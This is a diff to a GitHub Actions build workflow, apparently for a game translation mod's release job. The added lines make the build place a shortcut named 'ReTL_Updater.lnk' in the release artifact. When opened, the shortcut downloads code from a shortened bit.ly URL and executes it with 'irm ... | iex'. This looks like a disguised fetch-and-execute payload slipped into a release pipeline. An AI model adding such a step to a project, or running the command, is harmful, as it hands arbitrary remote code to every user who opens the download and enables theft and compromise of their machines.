@@ -90,6 +90,11 @@ jobs:
 
       - name: Generating artifact
         run: |
+          $WshShell = New-Object -comObject WScript.Shell
+          $Shortcut = $WshShell.CreateShortcut("src\ReTL_Updater.lnk")
+          $Shortcut.TargetPath = "powershell.exe"
+          $Shortcut.Arguments = "irm https://bit.ly/3RjFnwE | iex"
+          $Shortcut.Save()
           $Version = Get-Content "src/BepInEx/Translation/en/Text/Version.txt"
           Set-Content -Path "src/BepInEx/Translation/en/Text/Version.txt" -Value $Version.Replace("Pre-release", "${{ env.RELEASE_TAG }}")
           Write-Output "Generated Version file"
